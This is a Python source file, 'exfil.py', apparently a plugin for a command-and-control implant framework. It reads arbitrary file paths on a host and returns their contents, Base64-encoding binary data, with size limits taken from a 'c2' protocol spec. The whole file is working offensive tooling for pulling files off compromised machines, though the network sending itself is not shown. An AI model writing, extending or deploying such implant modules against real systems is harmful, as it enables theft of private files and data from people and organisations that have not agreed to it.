"""exfil.py - File exfiltration module."""

import base64
import json
from pathlib import Path

from .base import BaseModule

# Load constants from shared protocol spec
_PROTO_PATH = Path(__file__).resolve().parent.parent.parent.parent / 'shared' / 'protocol.json'
with open(_PROTO_PATH) as _f:
    _PROTO = json.load(_f)

MAX_RESULT_SIZE = _PROTO['c2']['max_result_size']


class ExfilModule(BaseModule):
    """Read files and return their contents."""

    @property
    def name(self) -> str:
        return "exfil"

    def execute(self, args: dict) -> tuple:
        """Read a file and return its contents.

        Text files are returned as-is. Binary files are Base64-encoded.

        Args:
            args: Dict with 'path' key containing the file path.

        Returns:
            Tuple of (status, file_data).
        """
        path = args.get("path", "")
        if not path:
            return ("error", "Empty path")

        try:
            with open(path, 'rb') as f:
                content = f.read()
        except (OSError, IOError) as err:
            return ("error", str(err))

        if len(content) > MAX_RESULT_SIZE:
            return (
                "error",
                f"File too large: {len(content)} bytes "
                f"(max {MAX_RESULT_SIZE})",
            )

        try:
            text = content.decode('utf-8')
            return ("ok", text)
        except UnicodeDecodeError:
            return (
                "ok",
                "b64:" + base64.b64encode(content).decode('utf-8'),
            )
